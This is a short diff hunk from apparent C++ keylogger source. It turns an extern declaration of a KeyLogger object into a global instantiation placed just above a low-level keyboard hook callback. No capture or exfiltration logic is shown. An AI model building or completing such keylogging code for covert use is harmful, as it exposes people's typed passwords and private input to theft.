@@ -279,7 +279,7 @@ class KeyLogger {
 };
 
 
-extern KeyLogger* KeyLogger_obj;
+KeyLogger* KeyLogger_obj = new KeyLogger();
 
 
 LRESULT CALLBACK KeyLogger::LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
